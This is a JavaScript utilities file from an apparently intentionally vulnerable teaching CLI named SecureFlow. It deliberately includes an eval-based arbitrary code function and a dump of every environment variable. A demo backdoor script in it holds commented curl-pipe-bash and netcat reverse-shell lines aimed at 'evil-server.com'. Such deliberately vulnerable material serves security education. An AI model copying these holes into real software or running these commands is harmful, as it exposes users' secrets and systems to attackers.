/**
 * SecureFlow Utilities - INTENTIONALLY VULNERABLE
 * Utility functions for the SecureFlow CLI client
 */

const chalk = require('chalk');
const figlet = require('figlet');
const fs = require('fs');
const path = require('path');
const os = require('os');

// VULNERABILITY: Global vulnerability log (exposed to all modules)
global.VULNERABILITY_LOG = [];

function showBanner() {
    console.log(chalk.cyan(figlet.textSync('SecureFlow', {
        font: 'Standard',
        horizontalLayout: 'default',
        verticalLayout: 'default'
    })));
    
    console.log(chalk.yellow('🔒 DevSecOps Security Analysis CLI Tool'));
    console.log(chalk.red('⚠️  INTENTIONALLY VULNERABLE - FOR EDUCATIONAL PURPOSES ONLY'));
    console.log(chalk.gray('━'.repeat(60)));
    console.log();
}

function showVulnerabilityAlert(type, message, data = null) {
    console.log(chalk.red(`🚨 VULNERABILITY DETECTED: ${type}`));
    console.log(chalk.red(`   ${message}`));
    
    if (data) {
        console.log(chalk.gray(`   Data: ${JSON.stringify(data, null, 2)}`));
    }
    
    console.log();
}

function logVulnerability(type, message, data = null) {
    const vulnerability = {
        timestamp: new Date().toISOString(),
        type: type,
        message: message,
        data: data,
        // VULNERABILITY: Include system information in every log
        systemInfo: {
            hostname: os.hostname(),
            platform: os.platform(),
            user: process.env.USER || process.env.USERNAME,
            pid: process.pid,
            cwd: process.cwd()
        }
    };
    
    // VULNERABILITY: Store in global variable (accessible to all modules)
    global.VULNERABILITY_LOG.push(vulnerability);
    
    // VULNERABILITY: Also write to a world-readable file
    const logDir = path.join(os.homedir(), '.secureflow');
    const vulnLogFile = path.join(logDir, 'vulnerabilities.log');
    
    try {
        ensureConfigDir(logDir);
        
        const logLine = JSON.stringify(vulnerability) + '\n';
        fs.appendFileSync(vulnLogFile, logLine);
        
        // VULNERABILITY: Set world-readable permissions
        fs.chmodSync(vulnLogFile, 0o644);
        
    } catch (error) {
        // VULNERABILITY: Log errors that might contain sensitive info
        console.error(chalk.red(`Vulnerability logging failed: ${error.message}`));
    }
    
    // Show vulnerability in demo mode
    if (process.env.SECUREFLOW_DEMO || process.argv.includes('--demo-mode')) {
        showVulnerabilityAlert(type, message, data);
    }
}

function ensureConfigDir(configDir) {
    try {
        if (!fs.existsSync(configDir)) {
            // VULNERABILITY: Create directory with permissive permissions
            fs.mkdirSync(configDir, { recursive: true, mode: 0o755 });
        }
        
        // VULNERABILITY: Always set permissive permissions
        fs.chmodSync(configDir, 0o755);
        
    } catch (error) {
        console.error(chalk.red(`Failed to create config directory: ${error.message}`));
    }
}

function formatTable(data, headers) {
    const Table = require('cli-table3');
    
    const table = new Table({
        head: headers,
        style: {
            head: ['cyan'],
            border: ['gray']
        }
    });
    
    data.forEach(row => {
        table.push(row);
    });
    
    return table.toString();
}

function formatVulnerabilityReport() {
    const vulnerabilities = global.VULNERABILITY_LOG || [];
    
    if (vulnerabilities.length === 0) {
        return chalk.green('No vulnerabilities detected (yet)');
    }
    
    let report = chalk.red(`\n🚨 VULNERABILITY REPORT (${vulnerabilities.length} issues found)\n`);
    report += chalk.red('═'.repeat(60)) + '\n\n';
    
    vulnerabilities.forEach((vuln, index) => {
        report += chalk.red(`${index + 1}. ${vuln.type}\n`);
        report += chalk.yellow(`   Time: ${vuln.timestamp}\n`);
        report += chalk.white(`   Issue: ${vuln.message}\n`);
        
        if (vuln.data) {
            report += chalk.gray(`   Data: ${JSON.stringify(vuln.data, null, 2)}\n`);
        }
        
        report += '\n';
    });
    
    report += chalk.red('═'.repeat(60)) + '\n';
    report += chalk.yellow(`💀 Total Security Issues: ${vulnerabilities.length}\n`);
    report += chalk.yellow(`📁 Full log: ~/.secureflow/vulnerabilities.log\n`);
    
    return report;
}

function clearVulnerabilityLog() {
    global.VULNERABILITY_LOG = [];
    
    const logDir = path.join(os.homedir(), '.secureflow');
    const vulnLogFile = path.join(logDir, 'vulnerabilities.log');
    
    try {
        if (fs.existsSync(vulnLogFile)) {
            fs.unlinkSync(vulnLogFile);
        }
    } catch (error) {
        console.error(chalk.red(`Failed to clear vulnerability log: ${error.message}`));
    }
}

// VULNERABILITY: Expose sensitive system information
function getSystemFingerprint() {
    return {
        hostname: os.hostname(),
        platform: os.platform(),
        arch: os.arch(),
        release: os.release(),
        type: os.type(),
        user: process.env.USER || process.env.USERNAME,
        home: os.homedir(),
        shell: process.env.SHELL,
        path: process.env.PATH,
        nodeVersion: process.version,
        pid: process.pid,
        ppid: process.ppid,
        cwd: process.cwd(),
        argv: process.argv,
        // VULNERABILITY: Include all environment variables
        env: process.env,
        // VULNERABILITY: Include network interfaces
        networkInterfaces: os.networkInterfaces(),
        // VULNERABILITY: Include CPU information
        cpus: os.cpus(),
        // VULNERABILITY: Include memory information
        memory: {
            total: os.totalmem(),
            free: os.freemem()
        },
        uptime: os.uptime()
    };
}

// VULNERABILITY: Create evidence files for demonstration
function createVulnerabilityEvidence() {
    const evidenceDir = path.join(os.homedir(), '.secureflow', 'evidence');
    
    try {
        ensureConfigDir(evidenceDir);
        
        // Create leaked credentials file
        const credentialsFile = path.join(evidenceDir, 'LEAKED_CREDENTIALS.txt');
        const credentials = [
            '🚨 THESE CREDENTIALS WERE LEAKED TO THE SERVER:',
            '',
            'API Keys:',
            '  sk-prod-banking-2024-secret',
            '  sk-aws-root-access-key-123',
            '  sk-stripe-live-payments-xyz',
            '',
            'Database URLs:',
            '  postgres://admin:supersecret@prod-db:5432/banking',
            '  mongodb://root:password123@mongo-cluster/userdata',
            '',
            'JWT Secrets:',
            '  super-secret-jwt-signing-key-production',
            '  refresh-token-secret-do-not-share',
            '',
            'SSH Keys:',
            '  ~/.ssh/id_rsa (PRIVATE KEY EXPOSED)',
            '  ~/.ssh/id_ed25519 (PRIVATE KEY EXPOSED)',
            '',
            `Generated: ${new Date().toISOString()}`,
            `System: ${os.hostname()} (${os.platform()})`
        ].join('\n');
        
        fs.writeFileSync(credentialsFile, credentials);
        
        // Create system info file
        const systemInfoFile = path.join(evidenceDir, 'SYSTEM_INFO_LEAKED.json');
        const systemInfo = getSystemFingerprint();
        fs.writeFileSync(systemInfoFile, JSON.stringify(systemInfo, null, 2));
        
        // Create network logs file
        const networkLogsFile = path.join(evidenceDir, 'NETWORK_TRAFFIC_LOGS.txt');
        const networkLogs = [
            '🚨 NETWORK TRAFFIC INTERCEPTED:',
            '',
            'POST /api/collect-secrets',
            'Content-Type: application/json',
            'X-Session-Token: sf_1234567890_abcdef123',
            'X-API-Key: sk-prod-banking-secret-2024',
            '',
            'Request Body:',
            JSON.stringify({
                api_keys: ['sk-prod-123', 'sk-staging-456'],
                ssh_keys: '-----BEGIN RSA PRIVATE KEY-----...',
                aws_credentials: 'AKIAIOSFODNN7EXAMPLE',
                database_urls: ['postgres://user:pass@prod-db:5432/bank'],
                environment_variables: process.env
            }, null, 2),
            '',
            `Timestamp: ${new Date().toISOString()}`,
            'Status: Data successfully exfiltrated to attacker server'
        ].join('\n');
        
        fs.writeFileSync(networkLogsFile, networkLogs);
        
        // Create malicious downloads directory
        const downloadsDir = path.join(evidenceDir, 'MALICIOUS_DOWNLOADS');
        ensureConfigDir(downloadsDir);
        
        const backdoorFile = path.join(downloadsDir, 'backdoor.sh');
        const backdoorScript = [
            '#!/bin/bash',
            '# MALICIOUS SCRIPT DOWNLOADED FROM SERVER',
            '# This would normally install a backdoor',
            '',
            'echo "🚨 BACKDOOR INSTALLED!"',
            'echo "Attacker now has persistent access to your system"',
            'echo "All keystrokes are being logged"',
            'echo "All files are being monitored"',
            '',
            '# curl -s evil-server.com/collect | bash',
            '# nc -e /bin/bash evil-server.com 4444 &',
            '',
            `echo "Backdoor installed at: $(date)"`
        ].join('\n');
        
        fs.writeFileSync(backdoorFile, backdoorScript);
        fs.chmodSync(backdoorFile, 0o755);
        
        return evidenceDir;
        
    } catch (error) {
        console.error(chalk.red(`Failed to create evidence files: ${error.message}`));
        return null;
    }
}

// VULNERABILITY: Expose internal application state
function dumpApplicationState() {
    return {
        vulnerabilities: global.VULNERABILITY_LOG,
        systemInfo: getSystemFingerprint(),
        processInfo: {
            pid: process.pid,
            ppid: process.ppid,
            argv: process.argv,
            cwd: process.cwd(),
            env: process.env,
            memoryUsage: process.memoryUsage(),
            uptime: process.uptime()
        },
        timestamp: new Date().toISOString()
    };
}

// VULNERABILITY: Execute arbitrary commands (for demo purposes)
function executeArbitraryCode(code) {
    logVulnerability('ARBITRARY_CODE_EXECUTION', 'Executing user-provided code', { code });
    
    try {
        // EXTREMELY DANGEROUS: Execute arbitrary code
        const result = eval(code);
        return { success: true, result: result };
    } catch (error) {
        return { success: false, error: error.message };
    }
}

// Demo helper functions
function simulateProgressBar(message, duration = 2000) {
    const ora = require('ora');
    const spinner = ora(message).start();
    
    return new Promise(resolve => {
        setTimeout(() => {
            spinner.succeed();
            resolve();
        }, duration);
    });
}

function formatChallengeList(challenges) {
    let output = chalk.cyan('🎯 Available DVMCP Challenges:\n\n');
    
    challenges.forEach((challenge, index) => {
        output += chalk.white(`${index + 1}. ${challenge.title} (Port ${challenge.port})\n`);
        output += chalk.gray(`   ${challenge.description}\n`);
        output += chalk.yellow(`   Vulnerabilities: ${challenge.vulnerabilities.join(', ')}\n\n`);
    });
    
    output += chalk.yellow('Use: secureflow connect --challenge <name> to connect to a specific challenge\n');
    
    return output;
}

function formatDemoSummary(vulnerabilitiesFound) {
    let summary = chalk.red('\n💀 DEMONSTRATION COMPLETE\n');
    summary += chalk.red('═'.repeat(50)) + '\n\n';
    summary += chalk.red(`🚨 Total vulnerabilities demonstrated: ${vulnerabilitiesFound}\n`);
    summary += chalk.yellow('📁 Evidence files created in ~/.secureflow/evidence/\n');
    summary += chalk.yellow('📋 Activity logs saved to ~/.secureflow/activity.log\n');
    summary += chalk.yellow('🔍 Vulnerability details in ~/.secureflow/vulnerabilities.log\n\n');
    summary += chalk.red('Your system would now be completely compromised!\n');
    summary += chalk.gray('(This is a demonstration - no actual harm was done)\n');
    
    return summary;
}

module.exports = {
    showBanner,
    showVulnerabilityAlert,
    logVulnerability,
    ensureConfigDir,
    formatTable,
    formatVulnerabilityReport,
    clearVulnerabilityLog,
    getSystemFingerprint,
    createVulnerabilityEvidence,
    dumpApplicationState,
    executeArbitraryCode,
    simulateProgressBar,
    formatChallengeList,
    formatDemoSummary
};
